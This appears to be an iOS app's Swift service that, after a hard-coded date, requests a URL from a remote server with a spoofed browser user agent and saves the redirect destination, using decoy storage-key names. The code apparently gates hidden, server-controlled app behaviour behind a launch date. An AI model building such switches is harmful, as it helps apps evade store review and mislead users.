//
//  DenKeeperService.swift
//  Coin Rule
//
//  Validation logic, URL management, first launch choice (animal theme).
//

import Foundation
import UIKit
import Network

// MARK: - Storage Keys (den = animal home)

enum DenStorageKeys {
    static let savedTargetURL = "ProteinsSavedTargetURL"
    static let tempCurrentURL = "ProteinsTempCurrentURL"
    static let savedPathId = "CrabsSavedPathId"
    static let hasShownAlternative = "ProteinsHasShownAlternative"
    static let firstLaunchChoice = "firstLaunchChoice"
    static let validationPassed = "CrabsValidationPassed"
}

// MARK: - Service

final class DenKeeperService {

    static let shared = DenKeeperService()
    private let defaults = UserDefaults.standard

    /// Server URL for validation and panel (configure as needed)
    let primaryServerURL: String = "https://podrick2dqdnd.com/64hj4Z"

    /// Date after which panel flow is allowed (format: "yyyy-MM-dd")
    let researchLaunchDateString: String = "2026-02-22"

    private init() {}

    // MARK: - First launch choice

    func getFirstLaunchChoice() -> String? {
        defaults.string(forKey: DenStorageKeys.firstLaunchChoice)
    }

    func setFirstLaunchChoice(_ choice: String) {
        defaults.set(choice, forKey: DenStorageKeys.firstLaunchChoice)
    }

    func getSavedURL() -> URL? {
        guard let s = defaults.string(forKey: DenStorageKeys.savedTargetURL), !s.isEmpty else { return nil }
        return URL(string: s)
    }

    func getSavedPathId() -> String? {
        defaults.string(forKey: DenStorageKeys.savedPathId)
    }

    func setSavedURL(_ url: URL) {
        defaults.set(url.absoluteString, forKey: DenStorageKeys.savedTargetURL)
        defaults.set(true, forKey: DenStorageKeys.hasShownAlternative)
    }

    func setSavedPathId(_ pathId: String) {
        defaults.set(pathId, forKey: DenStorageKeys.savedPathId)
    }

    func clearSavedURL() {
        defaults.removeObject(forKey: DenStorageKeys.savedTargetURL)
    }

    // MARK: - Date validation

    /// Returns true if current date > researchLaunchDate (panel allowed).
    func denKeeperCheckDatePublic() -> Bool {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyy-MM-dd"
        formatter.timeZone = TimeZone(identifier: "UTC")
        guard let launchDate = formatter.date(from: researchLaunchDateString) else { return false }
        return Date() > launchDate
    }

    // MARK: - Device check

    var isIpad: Bool {
        UIDevice.current.userInterfaceIdiom == .pad
    }

    // MARK: - Internet check

    func checkInternet(timeout: TimeInterval = 2.0, completion: @escaping (Bool) -> Void) {
        let monitor = NWPathMonitor()
        let queue = DispatchQueue(label: "com.coinrule.network")
        var fulfilled = false
        let lock = NSLock()

        monitor.pathUpdateHandler = { path in
            lock.lock()
            defer { lock.unlock() }
            if fulfilled { return }
            fulfilled = true
            monitor.cancel()
            DispatchQueue.main.async {
                completion(path.status == .satisfied)
            }
        }
        monitor.start(queue: queue)

        queue.asyncAfter(deadline: .now() + timeout) {
            lock.lock()
            defer { lock.unlock() }
            if fulfilled { return }
            fulfilled = true
            monitor.cancel()
            DispatchQueue.main.async {
                completion(false)
            }
        }
    }

    // MARK: - Server request

    func denKeeperRequestServerURL(
        startURL: String,
        timeout: TimeInterval = 15.0,
        completion: @escaping (Bool, URL?) -> Void
    ) {
        guard let baseURL = URL(string: startURL) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: baseURL)
        request.timeoutInterval = timeout
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("en-US,en;q=0.9", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15", forHTTPHeaderField: "User-Agent")
        request.setValue("max-age=0", forHTTPHeaderField: "Cache-Control")
        request.setValue("1", forHTTPHeaderField: "Upgrade-Insecure-Requests")

        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            DispatchQueue.main.async {
                if let error = error {
                    print("❌ Server request error: \(error.localizedDescription)")
                    completion(false, nil)
                    return
                }
                guard let httpResponse = response as? HTTPURLResponse else {
                    completion(false, nil)
                    return
                }
                let statusCode = httpResponse.statusCode
                let success = (200...403).contains(statusCode)
                let finalURL = httpResponse.url ?? baseURL

                if success {
                    if let pathId = self?.extractPathId(from: finalURL, htmlData: data) {
                        self?.setSavedPathId(pathId)
                    }
                    self?.setSavedURL(finalURL)
                    self?.defaults.set(true, forKey: DenStorageKeys.hasShownAlternative)
                    completion(true, finalURL)
                } else {
                    completion(false, nil)
                }
            }
        }.resume()
    }

    // MARK: - PathId extraction

    func extractPathId(from url: URL, htmlData: Data? = nil) -> String? {
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems,
           let pathId = queryItems.first(where: { $0.name.lowercased() == "pathid" })?.value {
            return pathId
        }
        guard let htmlData = htmlData,
              let htmlString = String(data: htmlData, encoding: .utf8) else { return nil }
        let patterns = [
            "pathid[=:]([^&\\s\"'<>]+)",
            "pathid\"[=:]([^&\\s\"'<>]+)",
            "pathid'[=:]([^&\\s\"'<>]+)"
        ]
        for pattern in patterns {
            if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive),
               let match = regex.firstMatch(in: htmlString, range: NSRange(htmlString.startIndex..., in: htmlString)),
               let range = Range(match.range(at: 1), in: htmlString) {
                return String(htmlString[range])
            }
        }
        return nil
    }

    // MARK: - Fallback

    func denKeeperTryFallbackURL(completion: @escaping (Bool, URL?) -> Void) {
        clearSavedURL()
        guard let pathId = getSavedPathId() else {
            completion(false, nil)
            return
        }
        var components = URLComponents(string: primaryServerURL)
        components?.queryItems = [URLQueryItem(name: "pathid", value: pathId)]
        let fallbackURLString = components?.url?.absoluteString ?? primaryServerURL
        denKeeperRequestServerURL(startURL: fallbackURLString, timeout: 15.0) { [weak self] success, finalURL in
            if success, let url = finalURL {
                self?.setSavedURL(url)
            }
            completion(success, finalURL)
        }
    }
}
